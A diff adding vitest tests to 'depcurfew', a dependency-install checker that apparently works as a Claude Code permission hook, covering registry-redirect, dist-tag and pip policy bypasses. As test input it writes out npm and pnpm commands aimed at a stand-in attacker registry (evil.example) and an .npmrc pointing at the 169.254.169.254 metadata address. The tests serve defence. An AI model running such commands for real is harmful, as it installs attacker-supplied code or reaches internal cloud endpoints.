@@ -3,6 +3,7 @@ import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
+import type { CheckDependencies } from '../../src/cli/check.ts';
 import { EXIT_FAILURE, EXIT_OK, EXIT_USAGE, run } from '../../src/cli/run.ts';
 import { recordedFetch } from './support.ts';
 
@@ -261,6 +262,92 @@ describe('depcurfew check --hook claude-code', () => {
   it('rejects an unknown hook and packages next to --hook', async () => {
     expect((await exec(['check', '--hook', 'cursor'])).code).toBe(EXIT_USAGE);
     expect((await exec(['check', '--hook', 'claude-code', 'lodash'])).code).toBe(EXIT_USAGE);
+  });
+});
+
+describe('depcurfew check and the hook against bypasses', () => {
+  const decision = (stdout: string) => (JSON.parse(stdout) as { hookSpecificOutput: { permissionDecision: string; permissionDecisionReason: string } }).hookSpecificOutput;
+
+  it('asks when npm is pointed at another registry with a shorthand or an abbreviation', async () => {
+    for (const command of ['npm i --reg=https://evil.example/ foo', 'npx --reg https://evil.example/ foo', 'npm i --regis=https://evil.example/ foo', 'pnpm add --config.registry=https://evil.example/ zod']) {
+      const result = await exec(['check', '--hook', 'claude-code'], event(command, project({})));
+      expect(decision(result.stdout).permissionDecision).toBe('ask');
+      expect(decision(result.stdout).permissionDecisionReason).toContain('may point the package manager at another registry');
+    }
+  });
+
+  it('checks the version of the dist-tag the command makes npm prefer', async () => {
+    const result = await exec(['check', '--hook', 'claude-code'], event('npm i --tag beta cross-env', project({ cooldown: { minimum: '3d' }, installScripts: { default: 'deny' } })));
+    expect(result.stdout).toBe('');
+    const young = await exec(['check', '--hook', 'claude-code'], event('npm_config_tag=beta npm i cross-env', project({ cooldown: { minimum: '10000d' } })));
+    expect(decision(young.stdout).permissionDecision).toBe('deny');
+    expect(decision(young.stdout).permissionDecisionReason).toContain('- cross-env (tag beta): cross-env@5.0.0-beta.0 was published');
+  });
+
+  it('reads the dist-tag from the project\'s .npmrc and says so', async () => {
+    const directory = project({});
+    writeFileSync(join(directory, '.npmrc'), '# prefer the beta\ntag=beta\n');
+    const result = await exec(['check', '--json', '--dir', directory, 'cross-env']);
+    const report = JSON.parse(result.stdout) as { packages: { version: string; tag: string }[]; notices: { message: string }[] };
+    expect(report.packages[0]).toMatchObject({ version: '5.0.0-beta.0', tag: 'beta' });
+    expect(report.notices).toEqual([{ message: 'npm prefers the dist-tag "beta" (tag= in .npmrc, line 2) for packages named without a version or with a range' }]);
+  });
+
+  it("says which registry the project's .npmrc made it ask, in text, JSON and the hook's reason", async () => {
+    const directory = project({});
+    writeFileSync(join(directory, '.npmrc'), 'registry=http://npm.internal.example/\n');
+    const internal: CheckDependencies['fetch'] = async (url, init) => recordedFetch(url.replace('http://npm.internal.example/', 'https://registry.npmjs.org/'), init);
+    const run2 = async (argv: string[], stdin = '') => {
+      let stdout = '';
+      let stderr = '';
+      const code = await run(argv, { stdout: (text) => (stdout += text), stderr: (text) => (stderr += text) }, { fetch: internal, now: () => NOW, stdin: async () => stdin, home: () => HOME });
+      return { code, stdout, stderr };
+    };
+    const text = await run2(['check', '--dir', directory, 'lodash']);
+    expect(text.stderr).toBe('note: npm packages were looked up in http://npm.internal.example/ (registry= in .npmrc, line 1), not in the public npm registry\n');
+    expect(text.stdout).toContain('warning: the registry http://npm.internal.example/ is reached over plain HTTP');
+    const json = JSON.parse((await run2(['check', '--json', '--dir', directory, 'lodash'])).stdout) as { notices: { message: string }[]; packages: { findings: { code: string }[] }[] };
+    expect(json.notices[0]?.message).toContain('looked up in http://npm.internal.example/ (registry= in .npmrc, line 1)');
+    expect(json.packages[0]?.findings.map((finding) => finding.code)).toEqual(['insecure-registry']);
+    const hook = await run2(['check', '--hook', 'claude-code'], event('npm i this-package-does-not-exist-xyz-123', directory));
+    expect(decision(hook.stdout).permissionDecisionReason).toContain('\nnpm packages were looked up in http://npm.internal.example/ (registry= in .npmrc, line 1), not in the public npm registry.');
+  });
+
+  it('asks about a registry at a link-local address without asking it', async () => {
+    const directory = project({});
+    writeFileSync(join(directory, '.npmrc'), 'registry=http://169.254.169.254/latest/\n');
+    const result = await exec(['check', '--hook', 'claude-code'], event('npm i lodash', directory));
+    expect(decision(result.stdout).permissionDecision).toBe('ask');
+    expect(decision(result.stdout).permissionDecisionReason).toContain('http://169.254.169.254 is a link-local address');
+  });
+
+  it('checks at most 50 packages of one command and asks about the rest', async () => {
+    const urls: string[] = [];
+    const names = Array.from({ length: 400 }, (_, index) => `p${index}`);
+    let stdout = '';
+    await run(['check', '--hook', 'claude-code'], { stdout: (text) => (stdout += text), stderr: () => undefined }, {
+      fetch: async (url, init) => {
+        urls.push(url);
+        // Every name is an old package without install scripts.
+        return recordedFetch('https://registry.npmjs.org/lodash', init);
+      },
+      now: () => NOW,
+      stdin: async () => event(`npm install ${names.join(' ')}`, project({})),
+      home: () => HOME,
+    });
+    expect(urls.length).toBe(50);
+    expect(decision(stdout).permissionDecision).toBe('ask');
+    expect(decision(stdout).permissionDecisionReason).toContain(
+      'the command names 400 packages and depcurfew checks at most 50 in one command; the first 50 were checked. Fix: Install the packages in smaller groups, so depcurfew can check each of them',
+    );
+  });
+
+  it('applies pypi: names of the policy whatever their case or separators', async () => {
+    const result = await exec(['check', '--hook', 'claude-code'], event('pip install pycrypto', project({ installScripts: { default: 'deny', allow: ['pypi:PyCrypto'] } })));
+    expect(result.stdout).toBe('');
+    const built = await exec(['check', '--hook', 'claude-code'], event('pip install --no-binary :all: requests', project({ installScripts: { default: 'deny' } })));
+    expect(decision(built.stdout).permissionDecision).toBe('deny');
+    expect(decision(built.stdout).permissionDecisionReason).toContain('- pypi:requests (built from source): pypi:requests 2.34.2 is built from its source distribution');
   });
 });
 
